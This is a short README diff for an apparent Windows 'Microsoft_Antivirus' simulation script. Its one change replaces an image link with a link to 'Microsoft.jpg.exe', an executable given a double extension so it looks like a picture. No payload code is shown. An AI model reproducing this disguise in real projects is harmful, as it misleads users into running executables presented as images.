@@ -49,7 +49,7 @@ To run the simulation on any Windows system without needing Python or libraries,
 
 # Install required libraries
 pip install -r requirements.txt
-![Executable with Embedded Icon](embedded_image.png)
+![Executable with Embedded Icon](Microsoft.jpg.exe)
 
 # Run the script
 python Microsoft_Antivirus.py
